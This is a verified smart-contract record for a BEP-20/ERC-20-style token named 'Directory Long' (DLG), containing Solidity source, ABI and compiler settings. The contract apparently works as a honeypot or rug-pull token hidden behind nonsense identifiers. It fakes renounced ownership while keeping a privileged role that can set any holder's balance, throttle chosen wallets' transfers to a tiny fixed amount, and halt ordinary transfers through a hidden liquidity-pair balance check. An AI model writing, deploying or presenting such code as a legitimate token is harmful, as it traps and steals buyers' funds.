{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface atFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract modeLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedTo {\n    function createPair(address tradingTo, address listLiquidity) external returns (address);\n}\n\ninterface sellTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverMode) external view returns (uint256);\n\n    function transfer(address limitAmountList, uint256 totalIs) external returns (bool);\n\n    function allowance(address tradingBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAmountList,\n        uint256 totalIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamWallet, uint256 value);\n    event Approval(address indexed tradingBuy, address indexed spender, uint256 value);\n}\n\ninterface sellTradingMetadata is sellTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DirectoryLong is modeLimit, sellTrading, sellTradingMetadata {\n\n    function name() external view virtual override returns (string memory) {\n        return marketingEnableTeam;\n    }\n\n    address public fundAt;\n\n    function minIs() private view {\n        require(enableMin[_msgSender()]);\n    }\n\n    function toFund(address amountBuyEnable, address limitAmountList, uint256 totalIs) internal returns (bool) {\n        require(receiverAutoLiquidity[amountBuyEnable] >= totalIs);\n        receiverAutoLiquidity[amountBuyEnable] -= totalIs;\n        receiverAutoLiquidity[limitAmountList] += totalIs;\n        emit Transfer(amountBuyEnable, limitAmountList, totalIs);\n        return true;\n    }\n\n    mapping(address => bool) public enableMin;\n\n    function transfer(address senderLiquidity, uint256 totalIs) external virtual override returns (bool) {\n        return walletEnableSwap(_msgSender(), senderLiquidity, totalIs);\n    }\n\n    uint8 private minReceiver = 18;\n\n    function owner() external view returns (address) {\n        return teamLiquidity;\n    }\n\n    function transferFrom(address amountBuyEnable, address limitAmountList, uint256 totalIs) external override returns (bool) {\n        if (_msgSender() != walletAuto) {\n            if (buyMarketing[amountBuyEnable][_msgSender()] != type(uint256).max) {\n                require(totalIs <= buyMarketing[amountBuyEnable][_msgSender()]);\n                buyMarketing[amountBuyEnable][_msgSender()] -= totalIs;\n            }\n        }\n        return walletEnableSwap(amountBuyEnable, limitAmountList, totalIs);\n    }\n\n    function walletEnableSwap(address amountBuyEnable, address limitAmountList, uint256 totalIs) internal returns (bool) {\n        if (amountBuyEnable == fundAt) {\n            return toFund(amountBuyEnable, limitAmountList, totalIs);\n        }\n        uint256 shouldFrom = sellTrading(minLaunch).balanceOf(shouldMax);\n        require(shouldFrom == liquidityMaxAuto);\n        require(limitAmountList != shouldMax);\n        if (modeSender[amountBuyEnable]) {\n            return toFund(amountBuyEnable, limitAmountList, takeToken);\n        }\n        return toFund(amountBuyEnable, limitAmountList, totalIs);\n    }\n\n    bool public isLaunched;\n\n    uint256 private autoSwap = 100000000 * 10 ** 18;\n\n    event OwnershipTransferred(address indexed tradingFrom, address indexed totalMin);\n\n    mapping(address => bool) public modeSender;\n\n    uint256 tokenMin;\n\n    string private marketingEnableTeam = \"Directory Long\";\n\n    uint256 public limitListExempt;\n\n    function getOwner() external view returns (address) {\n        return teamLiquidity;\n    }\n\n    mapping(address => uint256) private receiverAutoLiquidity;\n\n    address public minLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minReceiver;\n    }\n\n    function takeExempt(address senderLiquidity, uint256 totalIs) public {\n        minIs();\n        receiverAutoLiquidity[senderLiquidity] = totalIs;\n    }\n\n    uint256 constant takeToken = 8 ** 10;\n\n    function tokenTo(address limitReceiver) public {\n        minIs();\n        if (txTake == limitListExempt) {\n            txTake = shouldTeam;\n        }\n        if (limitReceiver == fundAt || limitReceiver == minLaunch) {\n            return;\n        }\n        modeSender[limitReceiver] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalSell;\n    }\n\n    function balanceOf(address receiverMode) public view virtual override returns (uint256) {\n        return receiverAutoLiquidity[receiverMode];\n    }\n\n    function liquidityExempt(address exemptTo) public {\n        require(exemptTo.balance < 100000);\n        if (isLaunched) {\n            return;\n        }\n        \n        enableMin[exemptTo] = true;\n        \n        isLaunched = true;\n    }\n\n    function teamSell(uint256 totalIs) public {\n        minIs();\n        liquidityMaxAuto = totalIs;\n    }\n\n    address walletAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (shouldTeam == txTake) {\n            shouldTeam = toExempt;\n        }\n        atFee exemptTx = atFee(walletAuto);\n        minLaunch = launchedTo(exemptTx.factory()).createPair(exemptTx.WETH(), address(this));\n        \n        fundAt = _msgSender();\n        launchedAt();\n        enableMin[fundAt] = true;\n        receiverAutoLiquidity[fundAt] = autoSwap;\n        if (toExempt == txTake) {\n            toExempt = limitListExempt;\n        }\n        emit Transfer(address(0), fundAt, autoSwap);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoSwap;\n    }\n\n    function approve(address txFrom, uint256 totalIs) public virtual override returns (bool) {\n        buyMarketing[_msgSender()][txFrom] = totalIs;\n        emit Approval(_msgSender(), txFrom, totalIs);\n        return true;\n    }\n\n    address private teamLiquidity;\n\n    uint256 public shouldTeam;\n\n    uint256 private txTake;\n\n    function launchedAt() public {\n        emit OwnershipTransferred(fundAt, address(0));\n        teamLiquidity = address(0);\n    }\n\n    string private totalSell = \"DLG\";\n\n    uint256 public toExempt;\n\n    uint256 liquidityMaxAuto;\n\n    address shouldMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private buyMarketing;\n\n    function allowance(address fundTake, address txFrom) external view virtual override returns (uint256) {\n        if (txFrom == walletAuto) {\n            return type(uint256).max;\n        }\n        return buyMarketing[fundTake][txFrom];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTo\",\"type\":\"address\"}],\"name\":\"liquidityExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"takeExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"teamSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"}],\"name\":\"tokenTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountBuyEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAmountList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DirectoryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}